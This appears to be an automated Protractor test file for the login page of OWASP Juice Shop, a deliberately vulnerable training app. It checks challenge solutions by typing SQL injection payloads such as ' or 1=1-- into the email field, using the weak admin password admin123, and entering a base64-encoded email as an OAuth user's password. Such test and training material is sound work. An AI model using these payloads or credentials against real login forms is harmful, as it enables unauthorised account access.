'use strict'

describe('/#/login', function () {
  var email, password, loginButton

  beforeEach(function () {
    browser.get('/#/login')
    email = element(by.model('user.email'))
    password = element(by.model('user.password'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', function () {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', function () {
      email.sendKeys('\' or 1=1--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    it('should log in Admin with SQLI attack on email field using "admin@juice-sh.op\'--"', function () {
      email.sendKeys('admin@juice-sh.op\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'loginAdmin'})
  })

  describe('challenge "loginJim"', function () {
    it('should log in Jim with SQLI attack on email field using "jim@juice-sh.op\'--"', function () {
      email.sendKeys('jim@juice-sh.op\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'loginJim'})
  })

  describe('challenge "loginBender"', function () {
    it('should log in Bender with SQLI attack on email field using "bender@juice-sh.op\'--"', function () {
      email.sendKeys('bender@juice-sh.op\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'loginBender'})
  })

  describe('challenge "adminCredentials"', function () {
    it('should be able to log in with original (weak) admin credentials', function () {
      email.sendKeys('admin@juice-sh.op')
      password.sendKeys('admin123')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'adminCredentials'})
  })

  describe('challenge "oauthUserPassword"', function () {
    it('should be able to log in as bjoern.kimminich@googlemail.com with base64-encoded email as password', function () {
      email.sendKeys('bjoern.kimminich@googlemail.com')
      password.sendKeys('YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'oauthUserPassword'})
  })
})
